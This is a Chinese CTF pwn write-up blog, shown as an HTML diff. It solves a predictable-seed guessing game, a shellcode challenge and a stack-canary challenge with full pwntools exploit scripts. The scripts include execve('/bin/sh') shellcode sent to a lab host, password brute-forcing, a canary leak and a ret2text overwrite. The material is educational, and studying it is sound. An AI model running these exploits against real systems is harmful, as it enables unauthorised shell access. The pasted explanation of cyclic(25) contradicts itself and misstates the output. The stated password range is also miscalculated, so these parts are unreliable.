+<li><p><strong>​<code>dq</code>​</strong>​ (Define Quad-word)</p>
+<ul>
+<li><p>表示在内存中分配一个 <strong>8字节（64位）</strong>  的空间（x86-64架构的标准字长）</p>
+</li>
+<li><p>类似的数据定义指令还有：</p>
+<ul>
+<li><code>db</code>​ (1字节)</li>
+<li><code>dw</code>​ (2字节)</li>
+<li><code>dd</code>​ (4字节)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>​<code>0Ah</code>​</strong>​</p>
+<ul>
+<li>十六进制值 <code>0xA</code>​，对应十进制 <code>10</code>​</li>
+<li>因此 <code>tests</code>​ 的初始值被设为 <code>10</code>​</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<hr>
+<h3 id="🔐-第二阶段：-dev-random​"><a href="#🔐-第二阶段：-dev-random​" class="headerlink" title="🔐 第二阶段：/dev/random​"></a>🔐 第二阶段：<code>/dev/random</code>​</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">random_file = fopen(<span class="string">&quot;/dev/random&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">fread(&amp;secret, <span class="number">4uLL</span>, <span class="number">1uLL</span>, random_file);</span><br><span class="line">fclose(random_file);</span><br><span class="line">secret = secret % <span class="number">0x15F90u</span> + <span class="number">10000</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里从 <code>/dev/random</code>​ 读取 4 字节随机数，然后限制到 <code>10000~89999</code>​ 之间。</li>
+<li>因为 <code>/dev/random</code>​ 是系统强熵源，你<strong>无法预测</strong>这个数字。</li>
+</ul>
+<p>❌ 无法预测。</p>
+<hr>
+<h3 id="🌀-第三阶段：arc4random​"><a href="#🌀-第三阶段：arc4random​" class="headerlink" title="🌀 第三阶段：arc4random​"></a>🌀 第三阶段：<code>arc4random</code>​</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret = (<span class="type">unsigned</span> <span class="type">int</span>)arc4random() % <span class="number">0x15F90</span> + <span class="number">10000</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>arc4random()</code>​ 是 libc 内部实现的安全随机数生成器，同样<strong>无法预测</strong>。</li>
+</ul>
+<p>❌ 无法预测。</p>
+<hr>
+<h3 id="✅-最后：flag-仍然给你！"><a href="#✅-最后：flag-仍然给你！" class="headerlink" title="✅ 最后：flag 仍然给你！"></a>✅ 最后：flag 仍然给你！</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;You only got two of them wrong, flag still for you.&quot;</span>);</span><br><span class="line">stream = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="built_in">puts</span>(lineptr);</span><br></pre></td></tr></table></figure>
+
+<p>即使你只对了第一阶段（可预测）而第二、三阶段都错了，也会输出 flag！</p>
+<hr>
+<h3 id="💡-总结：利用策略"><a href="#💡-总结：利用策略" class="headerlink" title="💡 总结：利用策略"></a>💡 总结：利用策略</h3><p>你只要<strong>猜中第一轮</strong>（即使用 <code>srandom(tm_yday)</code>​ 预测 <code>random()</code>​），就能拿到 flag。</p>
+<p>可以写一个利用脚本如下（Python 伪代码）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import cdll # cdll 用于调用系统的 libc（也就是模拟题目中的 srandom 和 random）</span><br><span class="line">from time import localtime # localtime() 是 Python 的函数（不是 C 的）</span><br><span class="line"></span><br><span class="line">io = ...</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</span><br><span class="line">libc.srandom(localtime().tm_yday - 1) # 注意 Python `time.localtime` 与 C 标准库的同名函数行为不同。</span><br><span class="line"></span><br><span class="line">for _ in range(10):</span><br><span class="line">    io.sendlineafter(b&quot;\n&quot;, str(libc.random() % 90000 + 10000).encode())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;\n&quot;, str(42).encode()) # 任意值</span><br><span class="line">io.sendlineafter(b&quot;\n&quot;, str(42).encode()) # 任意值</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>题目为猜数字游戏，生成随机数的种子是 一年中当前天数 - 1（localtime(…).tm_yday）。照抄附件程序中生成随机数的逻辑并预先生成好 10 个随机数并依次输入即可。为方便，也可使用 Python ctypes。</p>
+<h3 id="💡-核心细节：种子设置"><a href="#💡-核心细节：种子设置" class="headerlink" title="💡 核心细节：种子设置"></a>💡 核心细节：种子设置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srandom(localtime().tm_yday - <span class="number">1</span>) </span><br></pre></td></tr></table></figure>
+
+<p>这是全剧的核心！</p>
+<ul>
+<li>脚本作者发现：<strong>题目用的是</strong> <strong>​<code>tm_yday</code>​</strong>​ <strong>作为种子</strong></li>
+<li>但 Python 的 <code>time.localtime()</code>​ 返回的 <code>tm_yday</code>​ 是 <strong>1-based</strong>（范围是 <code>1~366</code>​）</li>
+<li>而 C 的 <code>tm_yday</code>​ 是 <strong>0-based</strong>（范围是 <code>0~365</code>​）</li>
+</ul>
+<p>👉 所以要减 1 才能和题目里的 <code>srandom(tm_yday)</code>​ 行为一致！</p>
+<h3 id="🎯-猜数字核心逻辑"><a href="#🎯-猜数字核心逻辑" class="headerlink" title="🎯 猜数字核心逻辑"></a>🎯 猜数字核心逻辑</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="built_in">str</span>(libc.random() % <span class="number">90000</span> + <span class="number">10000</span>).encode())</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>题目要你猜 10 个五位数</li>
+<li>用 Python 本地的 libc 和题目一样的种子模拟出同样的 <code>random()</code>​ 序列</li>
+<li>然后直接 sendline 猜中！</li>
+</ul>
+<h1 id="题目：这是什么？shellcode！​"><a href="#题目：这是什么？shellcode！​" class="headerlink" title="题目：这是什么？shellcode！​"></a>题目：<code>这是什么？shellcode！</code>​</h1><p><img src="/./../images/Snipaste_2025-04-13_20-50-10-20250413221647-4v3284t.png" alt="Snipaste_2025-04-13_20-50-10"></p>
+<p>程序反编译失败</p>
+<p><img src="/./../images/Snipaste_2025-04-13_22-29-01-20250413222927-ozarlw3.png" alt="Snipaste_2025-04-13_22-29-01"></p>
+<p>有题目可知，这是一道简单的shellcode，程序直接调用read()读入我们的输入到栈上，再将栈上的输入存进 rdx 寄存器，再调用rdx寄存器（！！！），call 指令只能用来调用函数，而寄存器中存的是数值，IDA反编译时不知道 rdx寄存器中存进的会是一段可执行的机器码，所以报错。</p>
+<p><img src="/./../images/Snipaste_2025-04-13_22-37-56-20250413223844-lfyymu6.png" alt="Snipaste_2025-04-13_22-37-56"></p>
+<p>选取这段汇编，Ctrl+n 将它换为 nop（一个无意义的填充物）</p>
+<p><img src="/./../images/Snipaste_2025-04-13_22-38-08-20250413224005-bd94l88.png" alt="Snipaste_2025-04-13_22-38-08"></p>
+<p>再按F5，反编译成功</p>
+<p><img src="/./../images/Snipaste_2025-04-13_22-40-18-20250413224100-3170zj2.png" alt="Snipaste_2025-04-13_22-40-18"></p>
+<p>buf到栈底的距离为0X110，程序限制输入长度为0x100，这里无法栈溢出</p>
+<p><img src="/./../images/Snipaste_2025-04-13_22-41-46-20250413224158-jiwkfwk.png" alt="Snipaste_2025-04-13_22-41-46"></p>
+<p>GOT表可写，堆栈可行，存在同时具备读、写、执行权限的内存段（shellcode）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">#io = process(&#x27;./preshellcode&#x27;)</span><br><span class="line">io = remote(&#x27;192.168.75.1&#x27;, 55722)</span><br><span class="line">shellcode = &quot;&quot;&quot;</span><br><span class="line">    xor rdx,rdx #将rdx自己与自己异或，结果为0，并存入rdx寄存器中（前面那个）</span><br><span class="line">    push rdx #将rdx中的0，压入栈中，成为新的栈顶元素，也可以理解为赋值给rsp</span><br><span class="line">    mov rsi,rsp #将rsp栈顶地址（指向0），赋给rsi寄存器</span><br><span class="line">    mov rax,0x68732f2f6e69622f #rax = &quot;/bin//sh&quot; 的 ASCII 编码</span><br><span class="line">    push rax #将/bin//sh压入栈</span><br><span class="line">    mov rdi,rsp #将rsp栈顶地址（指向/bin//sh）,赋给rdi寄存器</span><br><span class="line">    mov rax,59 #将59（execve的系统调用号）存入rax寄存器</span><br><span class="line">    syscall #触发系统调用</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="题目：Catch-the-canary-​"><a href="#题目：Catch-the-canary-​" class="headerlink" title="题目：Catch_the_canary!​"></a>题目：<code>Catch_the_canary!</code>​</h1><blockquote>
+<p>Canary in a coalmine.</p>
+</blockquote>
+<p>你听说过金丝雀（canary）吗？我在栈里养了一只，关在笼子里。下次你再把栈玩坏的时候，它会告诉我。只准看不准碰嗷。</p>
+<p><img src="/./../images/Snipaste_2025-04-14_20-51-54-20250414205222-b9qz60l.png" alt="Snipaste_2025-04-14_20-51-54"></p>
+<p><img src="/./../images/Snipaste_2025-04-14_21-03-42-20250414210408-x4vv4ju.png" alt="Snipaste_2025-04-14_21-03-42"></p>
+<p>这题主要有四道验证（其他的不需要专门记录）</p>
+<p>按 shift + F12，查看字符串</p>
+<p><img src="/./../images/Snipaste_2025-04-14_20-55-32-20250414205602-hwslqr4.png" alt="Snipaste_2025-04-14_20-55-32"></p>
+<p>既有 system 函数，又有 &#x2F;bin&#x2F;sh，可以期待一下会不会直接给出后门了，在函数里翻翻找找，还真有</p>
+<p><img src="/./../images/Snipaste_2025-04-14_20-57-13-20250414205758-05h7l84.png" alt="Snipaste_2025-04-14_20-57-13"></p>
+<p>那这样的话，这题主要需要突破 main() 里的四道验证，然后直接ret2txt到达后门函数就<strong>getshell了。</strong></p>
+<p>然我们在好好看看这四道验证。</p>
+<p><img src="/./../images/Snipaste_2025-04-14_20-51-54-20250414205222-b9qz60l.png" alt="Snipaste_2025-04-14_20-51-54"></p>
+<p>首先生成了两个随机数（没有随机数种子，看来是真随机），v3和v8，将 v3 经过了一番操作后，给了v9[0]。</p>
+<h5 id="来到第一关"><a href="#来到第一关" class="headerlink" title="来到第一关"></a>来到第一关</h5><p>要求输入的值，必须等于随机数v8，且不等于 -1，<strong>若不满足条件，则重复循环，好好看看v8的生成过程</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = (unsigned int)arc4random(argc, 0LL, v4) % 0x2345 + 16768186;</span><br></pre></td></tr></table></figure>
+
+<p>发现 16768186 &lt;&#x3D; v8 &lt;&#x3D; 16768186 + 0x2345（&#x3D;9029），这个范围比较小，且程序语序我们重复输入，就可以直接爆破</p>
+<p><code>cage_bak = v9[0];  // 备份初始值，后续会检验cage_bak ?= v9[0]，即检验v9[0]是否还是原来的值，有无被覆盖成其他值</code>​</p>
+<h5 id="来到第二关"><a href="#来到第二关" class="headerlink" title="来到第二关"></a>来到第二关</h5><p>先输入值到 v[0],v[1],v[2]  <em><strong>(程序定义的数组是__int64 v9[2];，实际数组只有v9[0],v9[1],不包含v9[2]，那这里读入的v9[2]到哪里去了？)v9[2]是v9[1]的下一个8字节地址，而实际上v9[1]的下一个8字节地址是 v10，所这里我们输入的数据实际上到了v10。</strong></em></p>
+<p>程序写的是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v10 = 182271573LL;</span><br></pre></td></tr></table></figure>
+
+<p>v10 &#x3D; 182271573，（LL代表定义的是一个它是一个长整数，是个 64 位的整数）</p>
+<p>验证要求：v10 &#x3D; 195874819</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if ( v10 != 195874819 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;[FATAL] Canary under attack. Shutting down...\n&quot;, 0x2EuLL);</span><br><span class="line">    _exit(1);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以这关只需当i &#x3D; 2 时，输入195874819，来覆盖v10即可。</p>
+<h5 id="来到第三关"><a href="#来到第三关" class="headerlink" title="来到第三关"></a>来到第三关</h5><p>前面令<code>cage_bak = v9[0];</code>​，后面又检验<code>cage_bak ？= v9[0];</code>​，不等就退出程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( v9[0] != cage_bak )</span><br><span class="line">&#123;</span><br><span class="line">  write(1, &quot;[FATAL] Hacker!\n&quot;, 0x10uLL);</span><br><span class="line">  _exit(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>前面说过，v9[0] 是一个真随机数，无法预测，而又要scanf()，输入数据到v9[0]，v9[1]，我们既无法知道v9[0]会是多少，也几乎不可能猜中，怎么办呢？😧 <strong>（hint）🥰</strong></p>
+<p><img src="/./../images/Snipaste_2025-04-14_22-16-08-20250414221624-0pxjafq.png" alt="Snipaste_2025-04-14_22-16-08"></p>
+<p>哇！</p>
+<h5 id="✅-scanf-输入-​-或-​-的绕过特性"><a href="#✅-scanf-输入-​-或-​-的绕过特性" class="headerlink" title="✅ scanf 输入 +​ 或 -​ 的绕过特性"></a>✅ scanf 输入 <code>+</code>​ 或 <code>-</code>​ 的绕过特性</h5><p><code>scanf(&quot;%zu&quot;, &amp;x)</code>​ 或 <code>scanf(&quot;%u&quot;, &amp;x)</code>​ 在读取无符号数字时，如果输入的是非法的内容（比如 <code>+</code>​ 或 <code>-</code>​ 而没有数字），<strong>​<code>scanf</code>​</strong>​ <strong>会返回</strong> <strong>​<code>0</code>​</strong>​，<strong>并不会改变</strong>  <strong>​<code>x</code>​</strong>​  <strong>的值</strong>，而且<strong>不会跳过这一轮循环</strong>，而是进入下一个 <code>scanf</code>​。</p>
+<p>但注意：</p>
+<ul>
+<li>如果输入的是 <code>-1</code>​，那么 <code>scanf</code>​ 会读入一个非常大的无符号数（2^64 - 1），因为是 <code>%zu</code>​。</li>
+<li>如果你输入的是纯符号（如 <code>+</code>​ 或 <code>-</code>​），<code>scanf</code>​ 不会读取成功，但它也不会消费掉输入，可能导致死循环。</li>
+</ul>
+<p>在这题里，这个特性可以用来<strong>跳过输入某些字段。</strong></p>
+<h5 id="来到第四关"><a href="#来到第四关" class="headerlink" title="来到第四关"></a>来到第四关</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read(0, buf, 0x30uLL);</span><br><span class="line">puts(buf);</span><br><span class="line">read(0, buf, 0x30uLL);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure>
+
+<p>不用多说，通过栈溢出覆盖canary的最低的第8位字节位 \x00(空字节)，使得puts()不会因为遇到空字节（\x00）而停止输出，从而在把 buf 输出的同时连带着我们 canary 的前7个字节一起输出，就可以得到canary的值</p>
+<p>就此，四关已过，getshell，上脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./mycanary&#x27;)</span><br><span class="line">#io = remote(&#x27;192.168.75.1&#x27;, 54712)</span><br><span class="line">aim = 0x4012C9</span><br><span class="line">io.recvuntil(b&quot;[Info] Password required.\n&quot;)</span><br><span class="line">for g in range(16768186, 16768186 + 9029):</span><br><span class="line">    io.sendline(str(g).encode())</span><br><span class="line">    output = io.recvuntil(b&#x27;]&#x27;)</span><br><span class="line">    if b&quot;Error&quot; not in output:</span><br><span class="line">        break</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">#pasue()</span><br><span class="line">io.recvuntil(b&quot;One shot.\n&quot;)</span><br><span class="line">io.sendline(b&quot;-&quot;)</span><br><span class="line">io.sendline(b&quot;1&quot;)</span><br><span class="line">io.sendline(str(0xbacd003).encode()) # 195874819 = 0xbacd003</span><br><span class="line"></span><br><span class="line">io.send(cyclic(25))</span><br><span class="line">io.recvuntil(b&#x27;g&#x27;)</span><br><span class="line">canary = u64(io.recv(7).rjust(8, b&#x27;\x00&#x27;))</span><br><span class="line">payload = cyclic(24) + p64(canary) + b&#x27;a&#x27;*8 + p64(aim)</span><br><span class="line">print(hex(canary))</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="最后的最后，还有一点要提出来学习的。"><a href="#最后的最后，还有一点要提出来学习的。" class="headerlink" title="最后的最后，还有一点要提出来学习的。"></a><strong>最后的最后，还有一点要提出来学习的。</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io.send(cyclic(25))</span><br><span class="line">io.recvuntil(b&#x27;g&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>我们用cyclic 生成25个字节，为什么可以确定第25个字节是 <strong>g !，从而单独取出后面带出来的 canary ?</strong></p>
+<p>在 <strong>pwntools</strong> 中，<code>cyclic</code>​ 生成的字符串<strong>不一定以</strong>  <strong>​<code>&#39;g&#39;</code>​</strong> ​ <strong>结尾</strong>，它的结尾字符取决于你请求的长度和 <code>cyclic</code>​ 的内部模式。以下是详细分析：</p>
+<hr>
+<h3 id="1-​cyclic​​-的默认行为"><a href="#1-​cyclic​​-的默认行为" class="headerlink" title="1.  ​cyclic​​ 的默认行为"></a><strong>1.</strong>  <strong>​<code>cyclic</code>​</strong>​ <strong>的默认行为</strong></h3><p><code>cyclic</code>​ 生成的字符串是一个<strong>循环递增的 4 字节序列</strong>，其字符顺序遵循：</p>
+<p>复制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>每 4 字节为一组，按字母表顺序递增（<code>a</code>​ → <code>b</code>​ → <code>c</code>​ → … → <code>z</code>​）。</p>
+</li>
+<li><p><strong>是否以</strong>  <strong>​<code>&#39;g&#39;</code>​</strong> ​ <strong>结尾取决于输入长度</strong>：</p>
+<ul>
+<li>若长度 <code>n</code>​ 满足 <code>n % 4 == 3</code>​，则最后一个字符通常是 <code>&#39;g&#39;</code>​（因为 <code>&#39;gaaa&#39;</code>​ 是第 7 组，<code>&#39;g&#39;</code>​ 是第 7 组的第一个字符）。</li>
+<li>其他长度可能以任意字母结尾。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="2-你的代码中的情况"><a href="#2-你的代码中的情况" class="headerlink" title="2. 你的代码中的情况"></a><strong>2. 你的代码中的情况</strong></h3><p>你的脚本中使用了 <code>cyclic(25)</code>​：</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io.send(cyclic(25))      # 25 % 4 = 1，所以最后一个字符是 &#x27;a&#x27;（第25字节是 &#x27;aaaabaaa...aaaa&#x27; 的第1字节）</span><br><span class="line">io.recvuntil(b&#x27;g&#x27;)       # 等待输出中出现 &#x27;g&#x27;（可能是 canary 泄露前的某个固定字符）</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>cyclic(25)</code>​ 的最后一个字符是 <code>&#39;a&#39;</code>​（因为 25 ÷ 4 = 6 余 1，第 25 字节是第 7 组的第 1 字节 <code>&#39;g&#39;</code>​ 的前一个字符）。</li>
+<li>但 <code>recvuntil(b&#39;g&#39;)</code>​ 的目的是<strong>过滤输出中 canary 之前的无关字符</strong>（例如程序打印的 <code>&quot;Canary: 0x...&quot;</code>​ 中的 <code>&#39;g&#39;</code>​），而非依赖 <code>cyclic</code>​ 的结尾。</li>
+</ul>
+<hr>
+<h3 id="3-为什么-​recvuntil-b-g-​-​-能工作？"><a href="#3-为什么-​recvuntil-b-g-​-​-能工作？" class="headerlink" title="3. 为什么 ​recvuntil(b&#39;g&#39;)​ ​ 能工作？"></a><strong>3. 为什么</strong> <strong>​<code>recvuntil(b&#39;g&#39;)</code>​</strong> ​ <strong>能工作？</strong></h3><ul>
+<li><p>程序在打印 canary 时可能会输出类似格式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Output: ...Error: Invalid input &#x27;aaaagaaa&#x27;\nCanary: 0x7f123456</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&#39;g&#39;</code>​ 是 <code>cyclic</code>​ 字符串中间的某个字符（如 <code>&#39;aaaagaaa&#39;</code>​），而非结尾。</li>
+</ul>
+</li>
+<li><p><code>recvuntil(b&#39;g&#39;)</code>​ 会<strong>持续读取数据，直到遇到第一个</strong>  <strong>​<code>&#39;g&#39;</code>​</strong> ​，从而对齐到 canary 泄露位置。</p>
+</li>
+</ul>
+<hr>
+<h3 id="4-关键结论"><a href="#4-关键结论" class="headerlink" title="4. 关键结论"></a><strong>4. 关键结论</strong></h3><ul>
+<li><p><code>cyclic</code>​ <strong>不保证以</strong>  <strong>​<code>&#39;g&#39;</code>​</strong> ​ <strong>结尾</strong>，但它的模式中必然包含 <code>&#39;g&#39;</code>​（因为字母表循环）。</p>
+</li>
+<li><p><code>recvuntil(b&#39;g&#39;)</code>​ 的目的是<strong>定位 canary 前的固定输出</strong>，而非匹配 <code>cyclic</code>​ 的结尾。</p>
+</li>
+<li><p>若想精确控制结尾字符，可以手动构造字符串：<br>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(24) + b&#x27;g&#x27;  # 强制以 &#x27;g&#x27; 结尾</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="5-验证方法"><a href="#5-验证方法" class="headerlink" title="5. 验证方法"></a><strong>5. 验证方法</strong></h3><p>你可以直接打印 <code>cyclic(25)</code>​ 观察结果：</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">print(cyclic(25))  # 输出：b&#x27;aaaabaaacaaadaaaeaaafaaa&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>输出为 <code>aaaabaaacaaadaaaeaaafaaa</code>​，确实不以 <code>&#39;g&#39;</code>​ 结尾，但内部包含 <code>&#39;gaaa&#39;</code>​ 子串。</li>
+</ul>
+<hr>
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
+<li><strong>​<code>cyclic</code>​</strong>​ <strong>不固定以</strong>  <strong>​<code>&#39;g&#39;</code>​</strong> ​ <strong>结尾</strong>，但它的模式中一定会出现 <code>&#39;g&#39;</code>​。</li>
+<li><strong>​<code>recvuntil(b&#39;g&#39;)</code>​</strong> ​ <strong>的作用是同步 I&#x2F;O</strong>，而非依赖 <code>cyclic</code>​ 的结尾。</li>
+<li>若需对齐 payload，建议结合上下文动态调整接收逻辑（如 <code>recvuntil(b&#39;Canary: &#39;)</code>​）</li>
+</ul>
+<p>‍</p>
+<p>这段代码是一个 CTF 中常见的 PWN 题目的主函数逻辑，包含了输入验证、canary 检查、防护机制，以及最终可控的缓冲区溢出点。我们逐部分来分析：</p>
+<hr>
+<h3 id="🧠-全局变量和栈变量说明"><a href="#🧠-全局变量和栈变量说明" class="headerlink" title="🧠 全局变量和栈变量说明"></a>🧠 <strong>全局变量和栈变量说明</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> v6;                   <span class="comment">// 用户输入的密码</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v8;          <span class="comment">// 正确密码（arc4random生成）</span></span><br><span class="line">__int64 v9[<span class="number">2</span>];            <span class="comment">// 存储用户输入的两个值（后续检查）</span></span><br><span class="line">__int64 v10;              <span class="comment">// 用于canary机制验证的标志</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">24</span>];             <span class="comment">// 输入缓冲区（vulnerable）</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v12;     <span class="comment">// 栈 canary，用于栈溢出保护</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="🔒-栈保护初始化"><a href="#🔒-栈保护初始化" class="headerlink" title="🔒 栈保护初始化"></a>🔒 <strong>栈保护初始化</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v12 = __readfsqword(<span class="number">0x28u</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>读取 FS 段寄存器的 offset 0x28，对应 x86_64 的栈 canary。</li>
+</ul>
+<hr>
+<h3 id="🔐-生成初始-canary-值"><a href="#🔐-生成初始-canary-值" class="headerlink" title="🔐 生成初始 canary 值"></a>🔐 <strong>生成初始 canary 值</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3 = arc4random(argc, argv, envp);</span><br><span class="line">v4 = v3 - <span class="number">0xFEFFFFFFFFFFFFL</span>L * ((__int64)((<span class="number">0x4040404040404081L</span>L * (<span class="type">unsigned</span> __int128)v3) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">54</span>);</span><br><span class="line">v9[<span class="number">0</span>] = v4 + <span class="number">0x1000000000000L</span>L;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用 <code>arc4random</code>​ 加上一些看似复杂的混淆计算，生成一个隐藏的“笼子锁” <code>v9[0]</code>​。</li>
+<li><code>cage_bak = v9[0]</code>​ 后续用于校验。</li>
+</ul>
+<hr>
+<h3 id="🧪-输入密码环节"><a href="#🧪-输入密码环节" class="headerlink" title="🧪 输入密码环节"></a>🧪 <strong>输入密码环节</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = arc4random(...) % <span class="number">0x2345</span> + <span class="number">16768186</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>生成一个随机密码（值在 <code>16768186 ~ 16770552</code>​ 范围）。</li>
+</ul>
